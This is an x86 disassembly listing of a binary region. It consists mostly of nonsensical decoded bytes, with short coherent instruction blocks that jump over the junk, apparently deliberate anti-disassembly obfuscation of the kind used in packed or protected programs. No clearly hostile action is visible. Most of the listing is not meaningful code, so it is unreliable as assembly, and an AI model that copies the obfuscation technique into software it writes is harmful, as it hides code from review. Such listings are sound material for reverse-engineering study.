  40415b:	jl     0x4040e3
  40415d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40415e:	xor    dl,BYTE PTR [ecx+0xd1158e]
  404164:	add    cl,BYTE PTR ds:0x531953d7
  40416a:	and    al,BYTE PTR [eax-0x1fc057c8]
  404170:	mov    esi,0x9eafea27
  404175:	cmp    dh,bl
  404177:	imul   ecx,DWORD PTR [edi+0x3d],0x27
  40417b:	inc    esp
  40417c:	mov    ds,WORD PTR [ecx-0x18]
  40417f:	cdq    
  404180:	lea    ebp,[eax]
  404182:	or     dl,BYTE PTR [eax+0x36903851]
  404188:	scas   al,BYTE PTR es:[edi]
  404189:	and    edx,edx
  40418b:	in     al,0x52
  40418d:	push   ds
  40418e:	stos   BYTE PTR es:[edi],al
  40418f:	jp     0x4041a8
  404191:	into   
  404192:	or     eax,0x36cf1ca4
  404197:	ins    DWORD PTR es:[edi],dx
  404198:	xor    al,0xda
  40419a:	test   DWORD PTR [edi+edi*1],ecx
  40419d:	xor    al,0xa9
  40419f:	ror    BYTE PTR [esi+0x78],1
  4041a2:	inc    ebp
  4041a3:	push   edx
  4041a4:	push   ecx
  4041a5:	(bad)  
  4041a6:	xchg   esp,eax
  4041a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a8:	shl    BYTE PTR [ebp-0x9],cl
  4041ab:	nop
  4041ac:	int3   
  4041ad:	fucomip st,st(2)
  4041af:	aad    0x7d
  4041b1:	dec    eax
  4041b2:	imul   esp,DWORD PTR [edi+0x6d],0x71
  4041b6:	or     DWORD PTR [ebx+edx*1-0x72],ebp
  4041ba:	scas   eax,DWORD PTR es:[edi]
  4041bb:	call   0x97bdc468
  4041c0:	out    dx,al
  4041c1:	mov    ah,0x6b
  4041c3:	jae    0x404158
  4041c5:	ror    DWORD PTR [ecx+0x766a9cd1],cl
  4041cb:	call   0x86d96271
  4041d0:	daa    
  4041d1:	mov    WORD PTR es:[eax+0x61095827],?
  4041d8:	xchg   esp,eax
  4041d9:	dec    edx
  4041da:	xor    BYTE PTR [edi-0x24f884f1],0x38
  4041e1:	push   esi
  4041e2:	adc    ah,BYTE PTR [edx-0x1a864cb8]
  4041e8:	cmp    dl,dh
  4041ea:	daa    
  4041eb:	dec    esp
  4041ec:	jnp    0x4041c9
  4041ee:	add    al,0x5d
  4041f0:	jge    0x4041b5
  4041f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041f3:	imul   esi,DWORD PTR [esi-0xffdfbdf],0xffffff95
  4041fa:	repz cmp eax,0x7e10810d
  404200:	outs   dx,DWORD PTR ds:[esi]
  404201:	retf   0xbef2
  404204:	cmp    eax,0xbb820ab
  404209:	stc    
  40420a:	xor    eax,0x4d385cd9
  40420f:	aas    
  404210:	mov    ds:0xe28e491c,al
  404215:	mov    ds:0x291ef133,al
  40421a:	std    
  40421b:	and    al,0x2c
  40421d:	inc    edi
  40421e:	sbb    eax,0x3357f655
  404223:	rol    DWORD PTR [ebx],0xc6
  404226:	mov    DWORD PTR [edx],eax
  404228:	mov    eax,DWORD PTR [ebp-0x8]
  40422b:	xor    eax,ecx
  40422d:	add    eax,esi
  40422f:	jmp    0x404374
  404234:	ffree  st(0)
  404236:	adc    BYTE PTR [ecx+esi*4-0x168e12ae],0xf2
  40423e:	mov    esi,0xb9003035
  404243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404244:	xor    al,0x18
  404246:	jo     0x4042b8
  404248:	sbb    BYTE PTR [edi+0x70],bh
  40424b:	jo     0x40428b
  40424d:	dec    ebx
  40424e:	xor    edx,ebx
  404250:	outs   dx,DWORD PTR ds:[esi]
  404251:	lds    ecx,FWORD PTR [eax+eiz*8]
  404254:	or     BYTE PTR [ebx],0x27
  404257:	rol    esi,0xe9
  40425a:	inc    ebx
  40425b:	imul   DWORD PTR ds:0x16414cfc
  404261:	retf   0xd56e
  404264:	div    DWORD PTR [esi]
  404266:	or     eax,eax
  404268:	xor    DWORD PTR ds:0x4e49b19e,esi
  40426e:	cdq    
  40426f:	dec    ebx
  404270:	popf   
  404271:	fisttp WORD PTR [ebp-0x51]
  404274:	or     eax,0x6f78e999
  404279:	into   
  40427a:	scas   al,BYTE PTR es:[edi]
  40427b:	cld    
  40427c:	xor    esi,DWORD PTR [edx+0x59]
  40427f:	out    dx,al
  404280:	mov    ebp,0x19470b4b
  404285:	(bad)  
  404286:	jnp    0x404213
  404288:	and    dh,BYTE PTR [ebp+0x161dec8b]
  40428e:	ret    
  40428f:	sbb    BYTE PTR [eax],0x24
  404292:	inc    esp
  404293:	adc    ch,dl
  404295:	or     cl,BYTE PTR [esi+edi*1-0x5c]
  404299:	frstor [edi-0x57654868]
  40429f:	or     dh,BYTE PTR [ebx-0x77]
  4042a2:	inc    eax
  4042a3:	cmp    DWORD PTR [ecx+eiz*8+0x61],edi
  4042a7:	imul   ecx,DWORD PTR [edi],0x5b3e7949
  4042ad:	xchg   esp,eax
  4042ae:	rcr    BYTE PTR [ebx+0x66e71b02],0x1e
  4042b5:	mov    al,0x79
  4042b7:	scas   al,BYTE PTR es:[edi]
  4042b8:	mov    esp,0xf430ed15
  4042bd:	xlat   BYTE PTR ds:[ebx]
  4042be:	in     eax,dx
  4042bf:	imul   esp,DWORD PTR [eax-0x56],0x3a
  4042c3:	scas   al,BYTE PTR es:[edi]
  4042c4:	test   al,0xc0
  4042c6:	jb     0x4042ed
  4042c8:	fcmovne st,st(2)
  4042ca:	pop    esp
  4042cb:	inc    DWORD PTR [esi+0x60bc9308]
  4042d1:	xor    DWORD PTR [esp+eax*8],esp
  4042d4:	pushf  
  4042d5:	lock sahf 
  4042d7:	lods   al,BYTE PTR ds:[esi]
  4042d8:	jge    0x40432d
  4042da:	adc    esp,ebx
  4042dc:	sbb    eax,0x7438508
  4042e2:	sub    BYTE PTR [esi-0x7b9e7ec9],ah
  4042e8:	xor    bl,BYTE PTR [esi-0x54]
  4042eb:	adc    BYTE PTR [ebp+0x55],ah
  4042ee:	add    ebx,DWORD PTR [edx+0x2d2302ef]
  4042f4:	addr16 dec edi
  4042f6:	ret    
  4042f7:	fild   QWORD PTR [ebp-0x5e8c0b5c]
  4042fd:	or     dl,ah
  4042ff:	xchg   edx,eax
  404300:	jb     0x4042a8
  404302:	jae    0x4042ce
  404304:	mov    dh,0xbe
  404306:	sub    al,0x2d
  404308:	out    0x17,eax
  40430a:	sbb    si,WORD PTR [ecx+0x7e]
  40430e:	push   ebp
  40430f:	hlt    
  404310:	mov    eax,0x37aeb99f
  404315:	cdq    
  404316:	fldcw  WORD PTR es:[ecx]
  404319:	bswap  edi
  40431b:	fcom   QWORD PTR [esi+0x13]
  40431e:	sbb    eax,0xf7501cbe
  404323:	shr    DWORD PTR [edi],cl
  404325:	gs push ss
  404327:	add    DWORD PTR [ecx+0x178301c6],esi
  40432d:	cmp    BYTE PTR [ebx+0x626e35f9],dh
  404333:	dec    esi
  404334:	jge    0x404397
  404336:	sahf   
  404337:	xor    cl,ah
  404339:	dec    esi
  40433a:	push   ecx
  40433b:	mov    esi,0xdaf0ab1d
  404340:	xor    BYTE PTR [esi+0x1d8e7cf0],ch
  404346:	push   eax
  404347:	hlt    
  404348:	add    al,bh
  40434a:	cwde   
  40434b:	sub    BYTE PTR [ecx-0x55],dl
  40434e:	add    al,0x2d
  404350:	push   cs
  404351:	aaa    
  404352:	(bad)  
  404353:	cmc    
  404354:	shl    ebx,0x64
  404357:	xlat   BYTE PTR ds:[ebx]
  404358:	(bad)  
  404359:	retf   
  40435a:	clc    
  40435b:	repz cmp DWORD PTR [ecx-0x5ee53fe2],edi
  404362:	fnsave [eax+0x65380ff2]
  404368:	inc    edi
  404369:	and    eax,0xd496408
  40436e:	dec    ecx
  40436f:	inc    esi
  404370:	(bad)  
  404371:	cs jl  0x4043ec
  404374:	mov    DWORD PTR [ebp+0x8],eax
  404377:	mov    eax,DWORD PTR [ebp+0x8]
  40437a:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  40437e:	mov    dl,BYTE PTR [ebp-0x1]
  404381:	cmp    al,dl
  404383:	je     0x4048da
  404389:	mov    eax,DWORD PTR [ebp+0x8]
  40438c:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  404390:	jmp    0x4044d5
  404395:	scas   al,BYTE PTR es:[edi]
  404396:	or     al,0x38
  404398:	repz (bad) 
  40439b:	test   eax,0x35388951
  4043a0:	rol    DWORD PTR [esp+eax*2],cl
  4043a3:	mov    eax,edx
  4043a5:	fsub   QWORD PTR [edi]
  4043a7:	jo     0x404419
  4043a9:	sbb    BYTE PTR [edi+0x70],bh
  4043ac:	jo     0x404413
  4043ae:	stos   BYTE PTR es:[edi],al
  4043af:	or     al,0xe1
  4043b1:	sahf   
  4043b2:	push   edx
  4043b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043b4:	jmp    0x40c0d1fe
  4043b9:	fild   WORD PTR [edi-0x7f38b33f]
  4043bf:	dec    eax
  4043c0:	jne    0x404377
  4043c2:	scas   al,BYTE PTR es:[edi]
  4043c3:	add    dh,bh
  4043c5:	sub    DWORD PTR [ebx-0x41110b94],edx
  4043cb:	loope  0x40439f
  4043cd:	jecxz  0x40436f
  4043cf:	loope  0x4043d4
  4043d1:	std    
  4043d2:	in     eax,dx
  4043d3:	push   ebx
  4043d4:	rcr    DWORD PTR [esi-0x3493d6a4],1
  4043da:	into   
  4043db:	jl     0x4043dc
  4043dd:	sub    dh,BYTE PTR [esi]
  4043df:	or     bh,BYTE PTR [eax-0x284ddbaf]
  4043e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043e6:	mov    eax,ds:0x5befdde0
  4043eb:	push   0xffffff8d
  4043ed:	jg     0x40444c
  4043ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4043f0:	and    ah,0xe3
  4043f3:	ret    
  4043f4:	xor    al,0x49
  4043f6:	mov    esi,0x723fa5a
  4043fb:	in     al,dx
  4043fc:	int    0xdf
  4043fe:	test   eax,esi
  404400:	push   ebx
  404401:	into   
  404402:	iret   
  404403:	daa    
  404404:	or     cl,BYTE PTR [esi+ecx*1+0x4e6a5331]
  40440b:	xor    ch,BYTE PTR [ebp+0x25]
  40440e:	aas    
  40440f:	daa    
  404410:	mov    WORD PTR [ebx+0x59],?
  404413:	loopne 0x404410
  404415:	mov    bh,0xb1
  404417:	xchg   ebp,eax
  404418:	test   ch,bl
  40441a:	mov    edx,0x233a9a2b
  40441f:	sbb    DWORD PTR [ecx-0x2c],esi
  404422:	add    cl,BYTE PTR [ecx]
  404424:	fsubr  QWORD PTR [edx+eiz*1+0x43]
  404428:	call   0xf09f:0x11b93e07
  40442f:	call   0x51cb:0x585ee24d
  404436:	dec    edx
  404437:	xlat   BYTE PTR ds:[ebx]
  404438:	sbb    al,0x9
  40443a:	push   es
  40443b:	daa    
  40443c:	lahf   
  40443d:	add    edi,DWORD PTR [eax-0x56]
  404440:	out    dx,eax
  404441:	in     al,0x17
  404443:	jb     0x4043d4
  404445:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404446:	mov    bh,0xfc
  404448:	in     al,0xa
  40444a:	and    dl,dh
  40444c:	mov    ch,0xad
  40444e:	adc    al,0xe1
  404450:	fcomp  DWORD PTR [edx]
  404452:	mov    ebx,edx
  404454:	pop    ds
  404455:	outs   dx,DWORD PTR ds:[esi]
  404456:	adc    ebx,ebp
  404458:	out    dx,al
  404459:	and    BYTE PTR [ebp+0x7c],cl
  40445c:	adc    dh,BYTE PTR [edi+0x3c95c735]
  404462:	cld    
  404463:	mov    ah,0x29
  404465:	adc    ecx,DWORD PTR [ebx-0x4906e5f8]
  40446b:	sub    al,0x5b
  40446d:	jb     0x404481
  40446f:	inc    ebx
  404470:	scas   eax,DWORD PTR es:[edi]
  404471:	and    al,0xf8
  404473:	cwde   
  404474:	xchg   ebx,eax
  404475:	pop    edi
  404476:	mov    edi,0x5a5419c4
  40447b:	fwait
  40447c:	push   edx
  40447d:	int3   
  40447e:	xor    DWORD PTR [ecx+0x6201a9b3],esi
  404484:	cld    
  404485:	pushf  
  404486:	xchg   edi,eax
  404487:	xchg   edx,eax
  404488:	cmp    DWORD PTR [edx-0x35097bbf],edx
  40448e:	sbb    DWORD PTR [eiz*4-0x31a48837],ebx
  404495:	add    al,bh
  404497:	xchg   esp,eax
  404498:	fcmovb st,st(1)
  40449a:	in     eax,dx
  40449b:	mov    ds:0xbcee92a6,eax
  4044a0:	push   edx
  4044a1:	sahf   
  4044a2:	ins    DWORD PTR es:[edi],dx
  4044a3:	or     ch,BYTE PTR [esi]
  4044a5:	xlat   BYTE PTR ds:[ebx]
  4044a6:	not    DWORD PTR [ebx]
  4044a8:	hlt    
  4044a9:	leave  
  4044aa:	mov    al,0xda
  4044ac:	sbb    cl,BYTE PTR [ecx-0x7e625bd5]
  4044b2:	xchg   esi,eax
  4044b3:	dec    ecx
  4044b4:	cmp    BYTE PTR [edx],ah
  4044b6:	pop    es
  4044b7:	sbb    BYTE PTR [ecx-0x271fccc8],0xe4
  4044be:	sbb    edi,DWORD PTR [esi+ebx*8-0x40]
  4044c2:	frstor [ebx+0x133f4813]
  4044c8:	and    eax,0x12a3595e
  4044cd:	aam    0xc2
  4044cf:	push   0x2e
  4044d1:	aas    
  4044d2:	mov    bh,0x74
  4044d4:	xchg   edi,eax
  4044d5:	mov    edx,DWORD PTR [ebp+0xc]
  4044d8:	cmp    al,BYTE PTR [edx]
  4044da:	jne    0x404ccf
  4044e0:	mov    eax,DWORD PTR [ebp-0x8]
  4044e3:	jmp    0x404628
  4044e8:	dec    edi
  4044e9:	push   edx
  4044ea:	test   ebx,esi
  4044ec:	xor    ebx,0x16807269
  4044f2:	popa   
  4044f3:	jns    0x40451f
  4044f5:	and    esi,edi
  4044f7:	cld    
  4044f8:	test   BYTE PTR [esi],ah
  4044fa:	jo     0x40456c
  4044fc:	sbb    BYTE PTR [edi+0x70],bh
  4044ff:	jo     0x404486
  404501:	push   esp
  404502:	icebp  
  404503:	repz test eax,0xcdc92c70
  404509:	cmp    BYTE PTR [ebx+0x22],dl
  40450c:	sub    al,0x72
  40450e:	pusha  
  40450f:	aaa    
  404510:	sbb    BYTE PTR [eax+0x1c799ab0],al
  404516:	out    0x68,al
  404518:	sahf   
  404519:	js     0x40450c
  40451b:	inc    esi
  40451c:	push   edi
  40451d:	lods   al,BYTE PTR ds:[esi]
  40451e:	inc    esi
  40451f:	xchg   edx,eax
  404520:	xor    ecx,edx
  404522:	push   eax
  404523:	test   DWORD PTR [ebp+0x5d],edi
  404526:	cld    
  404527:	add    eax,0x818ee4df
  40452c:	les    eax,FWORD PTR [edx+0x5393761b]
  404532:	les    edi,FWORD PTR [ecx-0x63d5f01d]
  404538:	les    esi,FWORD PTR ds:0x9dcb00e5
  40453e:	mov    eax,0xc90aae75
  404543:	ins    DWORD PTR es:[edi],dx
  404544:	xchg   edx,eax
  404545:	addr16 jbe 0x4044ec
  404548:	mov    eax,0x8f950f6b
  40454d:	pop    edx
  40454e:	ss into 
  404550:	mov    DWORD PTR [esi],esi
  404552:	add    BYTE PTR [edx+0x21],dh
  404555:	pop    es
  404556:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404558:	pop    ebx
  404559:	cmp    eax,0xd2953e64
  40455e:	cs xchg ecx,eax
  404560:	pop    ebp
  404561:	jb     0x4045aa
  404563:	mov    eax,ds:0x741f55ce
  404568:	jmp    0x7fab:0xbb095f26
  40456f:	lods   eax,DWORD PTR ds:[esi]
  404570:	int3   
  404571:	dec    ebx
  404572:	sbb    al,0x29
  404574:	aas    
  404575:	jle    0x404505
  404577:	cmp    BYTE PTR [esi],ah
  404579:	bound  ecx,QWORD PTR [esi]
  40457b:	aas    
  40457c:	xor    bl,cl
  40457e:	push   ecx
  40457f:	call   0x5e4f:0xc5540fef
  404586:	int    0xef
  404588:	jmp    0xf480:0x7e6ebac7
  40458f:	xchg   eax,ebx
  404591:	push   ss
  404592:	clc    
  404593:	ins    DWORD PTR es:[edi],dx
  404594:	nop
  404595:	jl     0x404607
  404597:	in     al,dx
  404598:	jo     0x404606
  40459a:	ins    BYTE PTR es:[edi],dx
  40459b:	int    0xe7
  40459d:	push   ss
  40459e:	xor    eax,0xeaae0e52
  4045a3:	in     al,0x30
  4045a5:	xor    ebx,DWORD PTR [ebp+0xe3d3ecb]
  4045ab:	retf   0x4613
  4045ae:	jecxz  0x404543
  4045b0:	or     BYTE PTR [edi-0x2786fbf3],0x51
  4045b7:	xchg   esp,eax
  4045b8:	lock addr16 test al,0x88
  4045bc:	push   eax
  4045bd:	outs   dx,BYTE PTR ds:[esi]
  4045be:	in     eax,0xd5
  4045c0:	adc    BYTE PTR [esi],cl
  4045c2:	in     al,0xd6
  4045c4:	push   ecx
  4045c5:	repz addr16 sub eax,0x6038d30f
  4045cc:	out    0x55,eax
  4045ce:	imul   DWORD PTR [edx-0x14]
  4045d1:	push   ebx
  4045d2:	jns    0x404588
  4045d4:	push   esi
  4045d5:	int    0x28
  4045d7:	and    cl,dh
  4045d9:	mov    dl,0xcc
  4045db:	push   esi
  4045dc:	data16 fcomip st,st(0)
  4045df:	or     eax,0xf799b0dd
  4045e4:	aas    
  4045e5:	sti    
  4045e6:	out    dx,al
  4045e7:	lds    ebp,FWORD PTR [ecx]
  4045e9:	mov    esp,0xc1b599ef
  4045ee:	je     0x404599
  4045f0:	mov    dl,0xf6
  4045f2:	js     0x4045ea
  4045f4:	test   ebp,esp
  4045f6:	jb     0x40463d
  4045f8:	pop    edx
  4045f9:	mov    al,ds:0x621a7b0
  4045fe:	xor    BYTE PTR ss:[ebx-0x8],al
  404602:	add    DWORD PTR [esi-0x2d2c3572],edx
  404608:	in     eax,0xbc
  40460a:	ds popa 
  40460c:	ror    BYTE PTR [edx+0x6eecbe92],cl
  404612:	std    
  404613:	push   0x6839678b
  404618:	idiv   DWORD PTR [edx+eiz*4]
  40461b:	aas    
  40461c:	sub    al,0xf4
  40461e:	neg    DWORD PTR [edx+0x5f]
  404621:	push   ds
  404622:	test   eax,0x3a37c34b
  404627:	ror    BYTE PTR [ebx-0x41f0f3ab],cl
  40462d:	adc    dh,BYTE PTR [ebx]
  40462f:	rol    DWORD PTR [ebx],0xc6
  404632:	cmp    edx,eax
  404634:	jmp    0x404779
  404639:	mov    edi,0x915e91cc
  40463e:	gs jae 0x40462a
  404641:	nop
  404642:	sbb    eax,0xee696c86
  404647:	popa   
  404648:	dec    ebp
  404649:	lods   al,BYTE PTR ds:[esi]
  40464a:	and    eax,0x7f187070
  40464f:	jo     0x4046c1
  404651:	cmp    DWORD PTR [esi+0x3fb09951],esp
  404657:	mov    esp,0xe30a49df
  40465c:	jns    0x40460a
  40465e:	ins    DWORD PTR es:[edi],dx
  40465f:	arpl   WORD PTR [ebp+eiz*8-0x71],si
  404663:	sub    BYTE PTR [ebp+0x8],bh
  404666:	sbb    eax,DWORD PTR [edi+0x5b7fd596]
  40466c:	test   cl,cl
  40466e:	out    dx,al
  40466f:	cmp    esi,ebx
  404671:	dec    esp
  404672:	push   esp
  404673:	mov    BYTE PTR [edi-0x4c],dh
  404676:	jge    0x4046c7
  404678:	sub    DWORD PTR [edx-0x54e96921],eax
  40467e:	outs   dx,BYTE PTR ds:[esi]
  40467f:	jne    0x404660
  404681:	mov    ebx,0xf434d4ba
  404686:	mov    ah,0xf4
  404688:	mov    DWORD PTR [ecx*8-0x1f390104],eax
  40468f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404690:	and    eax,0xfeac0d3a
  404695:	dec    ebx
  404696:	push   ds
  404697:	mov    dl,0xf6
  404699:	pusha  
  40469a:	rol    ebp,1
  40469c:	and    edx,ebp
  40469e:	mov    bh,0xb1
  4046a0:	repnz dec ebp
  4046a2:	or     BYTE PTR [ebx+0x78382c4b],0x72
  4046a9:	or     eax,0x43afcf17
  4046ae:	js     0x4046ea
  4046b0:	daa    
  4046b1:	cli    
  4046b2:	aaa    
  4046b3:	add    eax,0xdd62a61
  4046b8:	jmp    0xc996d662
  4046bd:	jl     0x4046f3
  4046bf:	xlat   BYTE PTR ds:[ebx]
  4046c0:	pop    edi
  4046c1:	enter  0x65d1,0xbe
  4046c5:	mov    ebx,0xe4412dcc
  4046ca:	pushf  
  4046cb:	xchg   DWORD PTR [ebx],edx
  4046cd:	xor    al,0x4f
  4046cf:	or     ch,dh
  4046d1:	ret    
  4046d2:	pop    edx
  4046d3:	or     ah,BYTE PTR [esi-0x32]
  4046d6:	repnz mov ecx,ds
  4046d9:	fmulp  st(6),st
  4046db:	push   ss
  4046dc:	sbb    esi,DWORD PTR [eax+0x53]
  4046df:	pop    esi
  4046e0:	mov    esp,0x7109b1cc
  4046e5:	call   0x666a:0xc7b97870
  4046ec:	jne    0x404686
  4046ee:	jno    0x40472f
  4046f0:	loop   0x4046c4
  4046f2:	out    dx,eax
  4046f3:	jno    0x404684
  4046f5:	fwait
  4046f6:	ja     0x40471d
  4046f8:	inc    ecx
  4046f9:	jge    0x4046aa
  4046fb:	push   ebx
  4046fc:	imul   edx,DWORD PTR [edi+0x22],0x10e43b4e
  404703:	inc    esi
  404704:	std    
  404705:	mov    eax,ds:0xba47d184
  40470a:	pop    ds
  40470b:	push   ds
  40470c:	add    DWORD PTR [ebp+0x4a],edx
  40470f:	cld    
  404710:	test   al,0x90
  404712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404713:	fdiv   DWORD PTR [ecx+0x775a5461]
  404719:	rcr    DWORD PTR [ebx-0x2325fab7],1
  40471f:	xchg   esp,eax
  404720:	repz push ebp
  404722:	pop    ds
  404723:	imul   esp,DWORD PTR fs:[ecx+0x1398f8c1],0x6ac0599a
  40472e:	gs pop ebx
  404730:	push   ebp
  404731:	add    eax,0x1443b0e2
  404736:	ja     0x404784
  404738:	and    edi,DWORD PTR [ebp-0x79]
  40473b:	push   ss
  40473c:	out    0x58,al
  40473e:	movhps QWORD PTR [ebp+0x604c3656],xmm0
  404745:	rol    BYTE PTR [ebx+0x1],1
  404748:	jb     0x404740
  40474a:	fdiv   st,st(5)
  40474c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40474d:	sub    al,0x9f
  40474f:	fwait
  404750:	daa    
  404751:	cli    
  404752:	out    dx,eax
  404753:	sti    
  404754:	mov    al,0x51
  404756:	xchg   esp,eax
  404757:	cmp    DWORD PTR [edx+0x44],ebx
  40475a:	mov    dh,0x41
  40475c:	jo     0x4046f2
  40475e:	in     al,0x62
  404760:	sbb    DWORD PTR [ebx-0x3a310ca4],esp
  404766:	push   ecx
  404767:	pop    eax
  404768:	or     ebp,ecx
  40476a:	adc    al,0xe7
  40476c:	(bad)  
  40476d:	test   BYTE PTR [ecx],bh
  40476f:	xchg   ebp,eax
  404770:	mov    esi,0xff8838cb
  404775:	mov    al,ds:0xf60e629
  40477a:	test   bh,bh
  40477c:	add    eax,DWORD PTR [eax]
  40477e:	add    bh,al
  404780:	inc    ebp
  404781:	call   0x7464515
  404786:	jmp    0x4048cb
  40478b:	aaa    
  40478c:	dec    ebp
  40478d:	rcr    DWORD PTR [edi],cl
  40478f:	jno    0x404732
  404791:	repz push ebp
  404793:	enter  0x209d,0xec
  404797:	lea    eax,[edi-0x5c]
  40479a:	into   
  40479b:	push   esp
  40479c:	and    al,0x70
  40479e:	jo     0x4047b8
  4047a0:	jg     0x404812
  4047a2:	jo     0x40475e
  4047a4:	fmul   st,st(2)
  4047a6:	and    ecx,DWORD PTR [esi]
  4047a8:	repz jbe 0x4047d9
  4047ab:	or     al,0x1a
  4047ad:	push   eax
  4047ae:	push   eax
  4047af:	mov    ch,0x2d
  4047b1:	xchg   esp,eax
  4047b2:	add    al,0x51
  4047b4:	outs   dx,BYTE PTR ds:[esi]
  4047b5:	mov    al,0x27
  4047b7:	jnp    0x404795
  4047b9:	cmp    DWORD PTR [ebp-0x7683a264],ebx
  4047bf:	arpl   bx,cx
  4047c1:	push   ecx
  4047c2:	shl    DWORD PTR [ecx+0x62e88cbe],1
  4047c8:	loop   0x40481d
  4047ca:	shr    cl,0x83
  4047cd:	popf   
  4047ce:	jle    0x404786
  4047d0:	add    ecx,ebp
  4047d2:	call   0x2ffb5686
  4047d7:	cmc    
  4047d8:	fxch   st(7)
  4047da:	pop    ss
  4047db:	mov    al,ds:0x1be009f0
  4047e0:	fstp   TBYTE PTR [ecx]
  4047e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047e3:	cmc    
  4047e4:	add    eax,0xa129e331
  4047e9:	sbb    ebx,esp
  4047eb:	cmp    DWORD PTR [ebx+edx*4],ecx
  4047ee:	outs   dx,DWORD PTR ds:[esi]
  4047ef:	xchg   edx,eax
  4047f0:	xlat   BYTE PTR es:[ebx]
  4047f2:	(bad)
  4047f6:	(bad)  
  4047f7:	lock push ebx
  4047f9:	sub    cl,BYTE PTR [edx+0x22969112]
  4047ff:	cmp    DWORD PTR [edx+eiz*1+0x73],ebx
  404803:	je     0x4047eb
  404805:	and    al,0xfd
  404807:	hlt    
  404808:	psrlq  mm7,mm2
  40480b:	sti    
  40480c:	xchg   BYTE PTR [ebx-0x6e905d9e],bl
  404812:	sbb    bh,BYTE PTR [ebx]
  404814:	in     al,0x6b
  404816:	mov    ecx,0x8a6f37f0
  40481b:	mov    esi,0xd745520d
  404820:	rcl    DWORD PTR [ecx],cl
  404822:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404823:	jg     0x4047f6
  404825:	xchg   esp,eax
  404826:	adc    BYTE PTR [edi],cl
  404828:	popa   
  404829:	dec    ebp
  40482a:	pop    ecx
  40482b:	repz jnp 0x404814
  40482e:	push   cs
  40482f:	mov    ch,0xd0
  404831:	(bad)  
  404832:	mov    al,0x9f
  404834:	inc    ebx
  404835:	(bad)  
  404836:	repz adc BYTE PTR [ebx-0x4b],dl
  40483a:	mov    al,0xa9
  40483c:	sbb    bh,BYTE PTR [ecx+0x4dcf5896]
  404842:	in     eax,0x92
  404844:	ffreep st(5)
  404846:	and    ecx,DWORD PTR [edx-0x6f]
  404849:	out    0x47,al
  40484b:	mov    bl,0x6a
  40484d:	fsubr  QWORD PTR [ecx]
  40484f:	jnp    0x4048af
  404851:	jae    0x4048a9
  404853:	or     DWORD PTR [edx],eax
  404855:	jns    0x40483d
  404857:	mov    eax,?
  404859:	jge    0x40486c
  40485b:	push   ecx
  40485c:	add    al,0xd9
  40485e:	cmp    eax,0x37ce3c9a
  404863:	cmp    ch,bh
  404865:	mov    bh,0xa7
  404867:	mov    eax,0x44dc4584
  40486c:	pop    esi
  40486d:	dec    ebp
  40486e:	inc    edi
  40486f:	xchg   esi,eax
  404870:	dec    eax
  404871:	push   edi
  404872:	into   
  404873:	fsub   QWORD PTR [edx]
  404875:	pop    ecx
  404876:	fcomp  QWORD PTR [ebx-0xd]
  404879:	mov    cx,0x506d
  40487d:	xchg   edx,eax
  40487e:	push   ecx
  40487f:	fisubr DWORD PTR [ebx-0x29ddfa7b]
  404885:	fwait
  404886:	sar    DWORD PTR [ecx-0x50],cl
  404889:	xlat   BYTE PTR ds:[ebx]
  40488a:	cmc    
  40488b:	xlat   BYTE PTR ds:[ebx]
  40488c:	pop    ebp
  40488d:	addr16 enter 0x7ca0,0xad
  404892:	setns  BYTE PTR [eax+0x9338542]
  404899:	adc    ch,BYTE PTR [edx-0x2e]
  40489c:	inc    edi
  40489d:	hlt    
  40489e:	dec    ecx
  40489f:	iret   
  4048a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048a1:	mov    ds:0x7330e160,al
  4048a6:	dec    eax
  4048a7:	jmp    0x404839
  4048a9:	sbb    esp,DWORD PTR [edx+0x27f97710]
  4048af:	xor    ah,BYTE PTR ds:0xb9338e2
  4048b5:	ficom  WORD PTR [edi-0x705e299b]
  4048bb:	ss jmp 0x4048c3
  4048be:	cmp    al,0xbf
  4048c0:	inc    ebp
  4048c1:	fnstenv gs:[edi+0x767b17d]
  4048c8:	int3   
  4048c9:	xchg   ecx,eax
  4048ca:	and    cl,BYTE PTR [ebp+0x4589e845]
  4048d0:	in     al,dx
  4048d1:	mov    eax,DWORD PTR [ebp-0x14]
  4048d4:	add    DWORD PTR [eax],0x705fa8f
  4048da:	mov    eax,DWORD PTR [ebp-0x10]
  4048dd:	mov    edx,DWORD PTR [ebp+0x8]
  4048e0:	xor    eax,ecx
  4048e2:	lea    eax,[eax+edx*1+0x32729c]
  4048e9:	mov    DWORD PTR [ebp+0x8],eax
  4048ec:	jmp    0x404a31
  4048f1:	mov    cl,BYTE PTR [eax]
  4048f3:	add    DWORD PTR [eax+0x12918b81],0xffffff82
  4048fa:	jecxz  0x404905
  4048fc:	or     eax,0xb8862bab
  404901:	jl     0x404925
  404903:	jo     0x404975
  404905:	sbb    BYTE PTR [edi+0x70],bh
  404908:	jo     0x404977
  40490a:	inc    esi
  40490b:	or     BYTE PTR [ebx+0x5b242331],0xf8
  404912:	mov    bh,BYTE PTR [eax+0x27]
  404915:	jl     0x404915
  404917:	mov    eax,ds:0x3a912dd4
  40491c:	jg     0x40496a
  40491e:	sti    
  40491f:	fimul  DWORD PTR [ecx-0x45]
  404922:	pop    DWORD PTR [esi]
  404924:	sub    cl,al
  404926:	repz clc 
  404928:	and    DWORD PTR [ecx+0x55bef4f4],ebx
  40492e:	fild   WORD PTR [edx-0x18819d67]
  404934:	shl    cl,1
  404936:	enter  0x3990,0x77
  40493a:	mov    al,0x60
  40493c:	sub    esi,DWORD PTR [ebx-0x2e]
  40493f:	lods   eax,DWORD PTR ds:[esi]
  404940:	sbb    al,0x6c
